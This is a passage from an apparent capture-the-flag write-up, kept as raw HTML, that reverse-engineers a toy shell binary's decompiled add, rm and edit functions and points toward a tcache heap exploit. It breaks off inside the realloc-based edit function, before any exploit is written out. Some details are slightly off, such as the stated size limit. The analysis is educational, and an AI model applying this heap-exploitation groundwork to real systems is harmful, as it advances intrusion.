</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;$ &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0xC7uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">1</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="n">v3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">rshell</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>main</code> functions runs in a <code>while</code> loop, then it takes input via <code>read</code> showing the prompt <code>$</code>, there&rsquo;s a call to the <code>initialize</code> function which was as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">initialize</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setreuid</span><span class="p">(</span><span class="mh">0x3E8u</span><span class="p">,</span> <span class="mh">0x3E8u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xC8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It just setus the buffereing and do <code>memset</code> on the global array named <code>directory_file_pointers</code>, the <code>rshell</code> function was defined as follows. The <code>rshell</code> function seems to have 4 options including <code>id</code>, <code>ls</code>, <code>add</code>, <code>rm</code> and <code>edit</code> which proposed the basic functionality of the shell:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">rshell</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;ls&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">print_directory</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;add &#34;</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;rm &#34;</span><span class="p">,</span> <span class="mi">3uLL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">remove</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;echo &#34;</span><span class="p">,</span> <span class="mi">5uLL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;edit &#34;</span><span class="p">,</span> <span class="mi">5uLL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">edit</span><span class="p">(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;whoami&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;r4j&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">&#34;id&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;rshell: %s: command not found</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>Allocated chunks here are referred to files in context of the binary</p>
</blockquote>
<p>Seeing this, when we do <code>ls</code>, it calls <code>print_directory</code> which showed the list of allocated files, then for <code>add</code>, <code>edit</code> and <code>rm</code> it calls their respective functions and the last one being the <code>id</code> which just prints the string <code>uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)</code>, so this was doing nothing,</p>
<hr>
<h5 id="add-function" class="relative group"><code>add</code> function <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#add-function" aria-label="Anchor">#</a></span></h5><p>This function was responsible for handling the workflow of adding new files:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">add</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">qword_4130</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Memory Error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="nf">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="nf">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;rshell: file exists&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">strncpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">a1</span><span class="p">,</span> <span class="mh">0xBEuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">LODWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;size: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x70</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;content: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">fgets</span><span class="p">(</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">],</span> <span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Memory Error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xC8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I&rsquo;d advise you to go through the code yourself, but the functionality of this function can be summed up as following:-</p>
<ul>
<li>First off, it checks if there&rsquo;s no allocated chunks already if it does, whether it exceeds the memory limit, if so, print <code>&quot;Memmory Error&quot;</code>.</li>
<li>Second, it iterates over the allocated chunks and comapare if the chunk name we are allocating is already available or not.</li>
<li>Then it asks for the size and checks if it is less than <code>0x78</code> or not, <strong>the size constraint hinted towards the tcache</strong>.</li>
<li>Then it allocates a chunk on heap with the size defined and attempt to take the input via <code>fgets</code> on that chunk.</li>
</ul>
<p>The takeaways from this function are as follows:-</p>
<ul>
<li>The number of chunks(files) we can add is 2 at most.</li>
<li>The size accepted for the chunk allocation is restricted to the 0x78, for which we can safely assume we will deal with tcache.</li>
</ul>
<h5 id="rm-function" class="relative group"><code>rm</code> function <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#rm-function" aria-label="Anchor">#</a></span></h5><p>The <code>rm</code> function which was responsible for removing chunks(files) from the binary was handled by this function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">remove</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xC8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">      <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;rm: cannot remove &#39;%s&#39;: No such file or directory</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function was responsible for deleting files(chunks) from the global array, the function can be summed up as:-</p>
<ul>
<li>It checks whether te specified files is in the gloabl array <code>directory_file_pointer</code>.</li>
<li>Then it does the <code>memset(chunk, 0x0, 0xc8)</code> which means whatever content was stored at that chunk would be <code>0x0</code> once we do <code>rm</code>.</li>
<li>After that, it <code>free</code> that chunk and set the global pointer to NULL, totally making this function from being a victim of Use After Free.</li>
</ul>
<p>Takeaways from this functions are:-</p>
<ul>
<li>Once <code>free</code>&rsquo;d, the chunks would not contain any data.</li>
<li>After being <code>free</code>&rsquo;d, it NULLs out the global pointer which held the pointer for the heap chunks.</li>
<li>No <strong>Use After Free</strong> from this function.</li>
</ul>
<h5 id="edit-function" class="relative group"><code>edit</code> function <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#edit-function" aria-label="Anchor">#</a></span></h5><p>We also have a function called <code>edit</code>, this one was of a great interest:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="nf">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="nf">HIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;rshell: No such file or directory&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">LODWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;size: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%u&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x70</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="nf">realloc</span><span class="p">(</span><span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)],</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;content: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">directory_file_pointer</span><span class="p">[</span><span class="mi">26</span> <span class="o">*</span> <span class="nf">SHIDWORD</span><span class="p">(</span><span class="n">size</span><span class="p">)],</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
